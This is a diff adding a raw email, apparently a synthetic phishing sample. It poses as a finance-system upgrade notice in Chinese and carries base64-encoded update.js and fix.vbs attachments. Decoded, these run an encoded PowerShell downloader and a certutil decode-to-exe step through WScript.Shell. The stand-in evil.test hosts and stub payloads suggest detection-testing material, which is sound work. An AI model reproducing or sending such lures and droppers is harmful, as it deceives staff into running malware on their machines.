@@ -1,0 +1,35 @@
+From: =?utf-8?B?6LSi5Yqh57O757uf?= <fin@corp.example.com>
+To: staff@corp.example.com
+Subject: =?utf-8?B?5oql6ZSA57O757uf5Y2H57qn6ISa5pysKOivt+i/kOihjCk=?=
+Date: Sat, 14 Nov 2026 17:27:01 GMT
+Message-ID: <a0791ac38605689ccd@evil.test>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="----=_Part_8ae008ed73e751d2"
+Received: from edge.corp.example.com (edge.corp.example.com [10.0.0.1])
+	by mailgw.internal.local with ESMTPS id EV2;
+	Sat, 14 Nov 2026 17:27:04 GMT
+Received: from bulk-mailer.evil.test (bulk-mailer.evil.test [45.9.148.77])
+	by edge.corp.example.com with ESMTP id EV1;
+	Sat, 14 Nov 2026 17:27:01 GMT
+Return-Path: <fin@bulk-mailer.evil.test>
+
+------=_Part_8ae008ed73e751d2
+Content-Type: text/plain; charset=utf-8
+
+运行附件脚本完成升级。
+
+------=_Part_8ae008ed73e751d2
+Content-Type: application/octet-stream
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="update.js"
+
+dmFyIHcgPSBuZXcgQWN0aXZlWE9iamVjdCgiV1NjcmlwdC5TaGVsbCIpOwp3LkV4ZWMoInBvd2Vy
+c2hlbGwgLWVuYyBTUUJGQUZnQSIpOwovLyBGcm9tQmFzZTY0U3RyaW5nIGRvd25sb2FkZXIK
+------=_Part_8ae008ed73e751d2
+Content-Type: application/octet-stream
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="fix.vbs"
+
+U2V0IHggPSBDcmVhdGVPYmplY3QoIldTY3JpcHQuU2hlbGwiKQp4LlJ1biAiY21kLmV4ZSAvYyBj
+ZXJ0dXRpbCAtZGVjb2RlIGM6XHQuYjY0IGM6XHQuZXhlIgpBdXRvT3BlbiBzdHViCg==
+------=_Part_8ae008ed73e751d2--
